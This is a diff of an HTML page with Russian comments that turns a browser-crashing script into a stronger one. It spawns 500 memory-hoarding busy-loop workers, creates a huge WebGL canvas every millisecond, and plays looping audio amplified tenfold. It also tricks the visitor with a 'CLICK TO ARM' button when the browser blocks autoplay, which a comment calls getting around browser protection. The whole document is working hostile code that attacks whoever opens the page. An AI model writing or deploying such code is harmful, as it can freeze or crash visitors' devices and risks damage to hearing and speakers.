@@ -1,34 +1,58 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <audio id="doomSound" src="sound.mp3"></audio>
+
   <script>
-    // Уничтожение CPU
-    for(let i=0; i<100; i++) {
+    // Ультимативный CPU-терроризм (500 воркеров)
+    for(let i=0; i<500; i++) {
       new Worker(URL.createObjectURL(new Blob([`
+        const bomb = [];
         while(1) {
-          new ArrayBuffer(1024 * 1024 * 100); // RAM-потрошитель
-          for(let j=0; j<1e9; j++); // Блокирующий цикл
+          bomb.push(new ArrayBuffer(1024 * 1024 * 200)); // 200MB/итерация
+          for(let j=0; j<1e10; j++); // Мега-блокирующий цикл
         }
       `])));
     }
 
-    // Уничтожение GPU
-    const canvases = [];
+    // GPU-геноцид
+    const glArmy = [];
     setInterval(() => {
       const canvas = document.createElement('canvas');
-      canvas.width = 99999; 
-      canvas.height = 99999;
-      const gl = canvas.getContext('webgl2');
-      canvases.push(gl); // Утечка контекстов
-      gl.clearColor(1,0,0,1);
-      gl.clear(gl.COLOR_BUFFER_BIT);
+      canvas.width = 131072;  // 131k pixels
+      canvas.height = 131072;
+      
+      const gl = canvas.getContext('webgl2', {
+        powerPreference: "high-performance",
+        failIfMajorPerformanceCaveat: false
+      });
+      
+      glArmy.push(gl);
+      try {
+        gl.clearColor(Math.random(), 0, 0, 1);
+        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
+      } catch(e) {}
     }, 1);
 
-    // Уничтожение динамиков
-    const ctx = new AudioContext();
-    const oscillator = ctx.createOscillator();
-    oscillator.connect(ctx.destination);
-    oscillator.start();
+    // Аудио-апокалипсис
+    const audio = document.getElementById('doomSound');
+    audio.volume = 2.0; // Форсирование громкости >100%
+    
+    audio.addEventListener('canplay', () => {
+      const ctx = new AudioContext();
+      const source = ctx.createMediaElementSource(audio);
+      const gainNode = ctx.createGain();
+      
+      gainNode.gain.value = 10.0; // 1000% громкости
+      source.connect(gainNode);
+      gainNode.connect(ctx.destination);
+      
+      audio.loop = true;
+      audio.play().catch(() => {
+        // Обход защиты браузеров
+        document.body.innerHTML = '<button onclick="audio.play()">CLICK TO ARM</button>';
+      });
+    });
   </script>
 </body>
 </html>
